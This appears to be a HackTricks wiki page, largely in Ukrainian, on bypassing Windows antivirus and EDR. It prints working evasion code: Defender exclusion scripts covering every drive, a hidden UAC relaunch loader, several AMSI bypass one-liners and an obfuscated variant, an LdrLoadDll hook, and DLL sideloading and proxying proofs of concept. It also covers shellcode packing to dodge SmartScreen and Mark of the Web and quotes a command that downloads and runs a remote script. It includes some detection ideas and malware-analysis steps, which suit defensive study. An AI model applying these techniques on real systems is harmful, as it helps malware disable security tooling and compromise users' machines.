# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Інсталятор-подібна пастка UAC перед втручанням у Defender

Публічні лоадери, що маскуються під читами для ігор, часто розповсюджуються як непідписані інсталятори Node.js/Nexe, які спочатку **просять користувача надати підвищені права** і лише потім нейтралізують Defender. Послідовність проста:

1. Перевіряють контекст адміністратора за допомогою `net session`. Ця команда виконується успішно лише коли виконавець має права адміністратора, тому невдача вказує, що лоадер запущено як звичайний користувач.
2. Негайно перезапускають себе з використанням `RunAs`, щоб викликати очікуваний запит підтвердження UAC, при цьому зберігаючи оригінальний командний рядок.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вірять, що встановлюють “cracked” програмне забезпечення, тому запит зазвичай приймається, надаючи malware права, необхідні для зміни політики Defender.

### Blanket `MpPreference` exclusions for every drive letter

Після підвищення привілеїв, GachiLoader-style ланцюги максимізують сліпі зони Defender замість того, щоб повністю відключати сервіс. Лоадер спочатку завершує GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) і потім встановлює **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і знімний диск стають недоступними для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл обходить кожну змонтовану файлову систему (D:\, E:\, USB-накопичувачі тощо), тож **будь-який майбутній payload, записаний будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` спрямоване на майбутнє — зловмисники залишають за собою опцію завантажити unsigned drivers пізніше без повторної взаємодії з Defender.
- Усі зміни потрапляють під `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу наступним етапам підтвердити, що виключення зберігаються, або розширити їх без повторного виклику UAC.

Оскільки жодна служба Defender не зупиняється, прості перевірки стану продовжують повідомляти «антивірус активний», хоча реальне сканування в реальному часі ніколи не торкається цих шляхів.

## **AV Evasion Methodology**

Наразі AV використовують різні методи перевірки файлу на шкідливість: static detection, dynamic analysis, а для більш просунутих EDR — behavioural analysis.

### **Static detection**

Статичне виявлення досягається шляхом відмітки відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також витягненням інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може частіше призвести до виявлення, оскільки їх, ймовірно, вже проаналізували й позначили як шкідливі. Є кілька способів обійти цей тип виявлення:

- **Encryption**

Якщо зашифрувати binary, AV не зможе виявити вашу програму, але вам знадобиться якийсь loader, щоб розшифрувати і виконати програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у binary або скрипті, щоб обійти AV, але це може зайняти багато часу залежно від того, що саме ви обфускуєте.

- **Custom tooling**

Якщо ви розробите власні інструменти, не буде відомих сигнатур, проте це вимагає багато часу та зусиль.

> [!TIP]
> Хороший спосіб перевірити статичне виявлення Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, таким чином можна точно дізнатися, які рядки або байти у вашому binary відмічені.

Рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Динамічний аналіз — це коли AV запускає ваш binary у sandbox і спостерігає за шкідливою активністю (наприклад, спроба розшифрувати і прочитати паролі браузера, виконати minidump на LSASS тощо). Ця частина може бути складнішою, але ось кілька прийомів для обходу sandbox.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis AV. AV мають дуже короткий час на сканування файлів, щоб не переривати роботу користувача, тому використання довгих затримок може порушити аналіз бінарників. Проблема в тому, що багато sandbox AV просто пропускають sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б сповільнювати машину користувача. Тут можна бути креативним — наприклад, перевіряти температуру CPU або швидкість вентиляторів; не все буде реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетувати користувача, робоча станція якого приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера і, якщо він не відповідає, припинити виконання програми.

Виявилось, що computername sandbox Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера в своєму malware перед детонацією; якщо ім'я збігається з HAL9TH, це означає, що ви в Defender sandbox, і можна зробити програму, яка завершує виконання.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо атак на Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як уже згадувалося раніше, **публічні інструменти** врешті-решт **будуть виявлені**, тож варто поставити собі питання:

Наприклад, якщо ви хочете дампити LSASS, чи дійсно вам потрібно використовувати mimikatz? Чи можна знайти інший, менш відомий проєкт, який теж дампить LSASS.

Правильна відповідь — ймовірно друге. Взяти mimikatz як приклад: він, мабуть, один з найчастіше виявлюваних інструментів AV та EDR; хоча проєкт дуже корисний, з ним складно обходитися для уникнення AV, тому просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> Під час модифікації payloads для уникнення виявлення обов'язково вимкніть автоматичну відправку зразків (automatic sample submission) у Defender, і, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL** якщо ваша ціль — довготривала евазія. Якщо хочете перевірити, чи виявляє конкретний AV ваш payload, встановіть його у VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте перевагу використанню DLL для евазії** — з мого досвіду файли DLL зазвичай **набагато менше виявляються** і аналізуються, тож це дуже простий прийом, щоб уникнути виявлення в деяких випадках (звісно, якщо ваш payload має спосіб виконуватися як DLL).

Як видно на цьому зображенні, DLL payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька трюків, які можна використовувати з DLL, щоб бути значно більш stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розташовуючи як victim application, так і malicious payload(s) поруч.

Ви можете перевірити програми, вразливі до DLL Sideloading, використовуючи [Siofra](https://github.com/Cybereason/siofra) та наступний powershell скрипт:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking, всередині "C:\Program Files\\" та DLL-файлів, які вони намагаються завантажити.

Я настійно рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable programs, вас можуть легко виявити.

Просто розміщення шкідливого DLL з іменем, яке програма очікує завантажити, не призведе до виконання вашого payload, оскільки програма очікує наявність певних функцій у цьому DLL. Щоб вирішити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма робить від proxy (і шкідливого) DLL до оригінального DLL, тим самим зберігаючи функціональність програми та дозволяючи обробити виконання вашого payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальний перейменований DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Обидва наші shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) та proxy DLL мають показник виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я назвав би це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **категорично рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше ознайомитися з обговореним.

### Зловживання Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Ключові моменти для розуміння:
- Якщо `TargetDll` є KnownDLL, він надається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує резолюцію переадресації.

Це дозволяє реалізувати непрямий примітив sideloading: знайдіть підписаний DLL, який експортує функцію, перенаправлену до модуля з ім'ям, що не є KnownDLL, потім розмістіть цей підписаний DLL поруч з attacker-controlled DLL з іменем, яке точно збігається з іменем цільового форварду. Коли переадресований експорт викликається, loader розв'язує forward і завантажує ваш DLL з тієї ж директорії, виконуючи DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому його підвантажують за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL у папку, доступну для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту саму папку. Мінімальний `DllMain` достатній, щоб отримати виконання коду; вам не потрібно реалізовувати перенаправлену функцію, щоб викликати `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ініціюйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час розв'язання `KeyIsoSetAuditingInterface` завантажувач слідує за форвардом до `NCRYPTPROV.SetAuditingInterface`
- Завантажувач потім завантажує `NCRYPTPROV.dll` з `C:\test` та виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізований, ви отримаєте помилку "missing API" тільки після того, як `DllMain` вже виконано

Hunting tips:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перераховані за адресою `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте Windows 11 forwarder inventory, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., `rundll32.exe`) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Сповіщати про ланцюги процесів/модулів, наприклад: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` під шляхами, доступними для запису користувача
- Запровадити політики цілісності коду (WDAC/AppLocker) і заборонити write+execute у директоріях застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб завантажити та виконати ваш shellcode у прихований спосіб.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це просто гра в кота й мишку: те, що працює сьогодні, може бути виявлено завтра, тож ніколи не покладайтеся лише на один інструмент; по можливості намагайтеся поєднувати кілька evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI був створений, щоб запобігти "fileless malware". Спочатку AVs могли сканувати лише **files on disk**, тож якщо вдалося виконати payloads **directly in-memory**, AVs нічого не могли зробити — у них не було достатньої видимості.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Для поточного процесу powershell було достатньо одного рядка коду, щоб зробити AMSI непридатним. Цей рядок, звісно, був виявлений самим AMSI, тому для використання цієї техніки потрібні певні модифікації.

Ось змінений AMSI bypass, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що це, ймовірно, буде помічено після публікації, тому не слід публікувати будь‑який код, якщо ваша мета — залишатися непоміченим.

**Memory Patching**

Ця техніка була вперше виявлена [@RastaMouse](https://twitter.com/_RastaMouse/) і полягає у знаходженні адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введених користувачем даних) та перезаписі її інструкціями, що повертають код E_INVALIDARG; таким чином результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI ініціалізується лише після того, як `amsi.dll` завантажується в поточний процес. Надійний, незалежний від мови обхід полягає у встановленні user‑mode hook на `ntdll!LdrLoadDll`, який повертає помилку, коли запитуваним модулем є `amsi.dll`. В результаті AMSI ніколи не завантажується, і для цього процесу сканування не відбуваються.

Огляд реалізації (x64 C/C++ псевдокод):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і власними завантажувачами (будь-яке, що в іншому випадку завантажило б AMSI).
- Використовуйте разом з передачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути артефактів довгого командного рядка.
- Спостерігалося використання в завантажувачах, що виконуються через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Видаліть виявлену сигнатуру**

Ви можете використати інструмент, такий як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Цей інструмент працює шляхом сканування пам'яті поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам'яті.

**AV/EDR продукти, які використовують AMSI**

Список AV/EDR продуктів, які використовують AMSI, можна знайти за посиланням **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви можете запускати свої скрипти без їх сканування AMSI. Ви можете зробити це:
```bash
powershell.exe -version 2
```
## Логування PowerShell

PowerShell logging — це функція, яка дозволяє записувати всі PowerShell-команди, виконані в системі. Це може бути корисно для аудиту та усунення несправностей, але також може стати **проблемою для атакувальників, які хочуть ухилитися від виявлення**.

Щоб обійти PowerShell logging, можна використати такі методи:

- **Disable PowerShell Transcription and Module Logging**: Можна використати інструмент, такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) для цієї мети.
- **Use Powershell version 2**: Якщо використовувати PowerShell version 2, AMSI не буде завантажено, тож ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб запустити powershell без захисту (саме це використовує `powerpick` з Cobal Strike).

## Обфускація

> [!TIP]
> Декілька технік обфускації ґрунтуються на шифруванні даних, що збільшує ентропію бінарного файлу і полегшить його виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до певних ділянок коду, які є чутливими або мають бути прихованими.

### Деобфускація ConfuserEx-захищених .NET бінарників

Під час аналізу malware, яке використовує ConfuserEx 2 (або комерційні форки), часто стикаються з кількома шарами захисту, які блокують декомпілятори та sandboxes. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який згодом можна декомпілювати у C# за допомогою інструментів таких як dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). Це також змінює PE checksum, тому будь-яка модифікація призведе до краху бінарного файлу. Використайте **AntiTamperKiller** щоб знайти зашифровані таблиці метаданих, відновити XOR keys і записати чистий збірник:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними при створенні власного unpacker.

2.  Symbol / control-flow recovery – передайте *clean* файл у **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Параметри:
• `-p crx` – вибір профілю ConfuserEx 2  
• de4dot відкотить control-flow flattening, відновить оригінальні простори імен, класи та імена змінних і дешифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легкими обгортками (так звані *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`, замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінарник у dnSpy, шукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *реальний* payload. Часто malware зберігає його як TLV-encoded масив байтів, ініціалізований всередині `<Module>.byte_0`.

Вищенаведена ланцюжок відновлює виконання **без** необхідності запускати шкідливий зразок – корисно при роботі на офлайновій робочій станції.

> 🛈  ConfuserEx створює кастомний атрибут з назвою `ConfusedByAttribute`, який можна використати як IOC для автоматичної триажі зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк [LLVM](http://www.llvm.org/) compilation suite, який може підвищити безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати `C++11/14` language для генерації під час компіляції obfuscated code без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерований C++ template metaprogramming framework, що ускладнить життя тому, хто захоче crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator, який може обфускувати різні PE файли, включаючи: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly code, перетворюючи звичайні інструкції в ROP chains, що руйнує наше природне уявлення про нормальний контроль потоку.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може конвертувати існуючі EXE/DLL у shellcode і потім їх завантажувати

## SmartScreen & MoTW

Ви могли бачити цей екран при завантаженні деяких виконуваних файлів з інтернету і їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації, тобто рідко завантажувані застосунки викликають спрацьовування SmartScreen, попереджаючи і перешкоджаючи кінцевому користувачу запустити файл (хоча файл все ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з ім'ям Zone.Identifier, який автоматично створюється при завантаженні файлів з інтернету разом з URL, звідки файл був завантажений.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **trusted** signing certificate, **won't trigger SmartScreen**.

Дуже ефективний спосіб запобігти попаданню ваших payloads під Mark of The Web — упаковувати їх у якийсь контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **cannot** бути застосований до **non NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, що пакує payloads у вихідні контейнери, щоб уникнути Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом упаковки payloads у файли ISO за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє додаткам і компонентам системи **реєструвати події**. Проте його також можуть використовувати засоби безпеки для моніторингу та виявлення шкідливої активності.

Подібно до того, як AMSI відключають (обходять), також можна змусити функцію **`EtwEventWrite`** користувацького процесу негайно повертати управління без реєстрації будь-яких подій. Це робиться шляхом патчінгу функції в пам'яті так, щоб вона одразу повертала значення, фактично відключаючи логування ETW для цього процесу.

Детальніше — в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам'ять відоме вже давно і досі є чудовим способом запуску ваших post-exploitation інструментів без виявлення AV.

Оскільки payload завантажується безпосередньо в пам'ять без запису на диск, нам потрібно буде турбуватися лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи зробити це:

- **Fork\&Run**

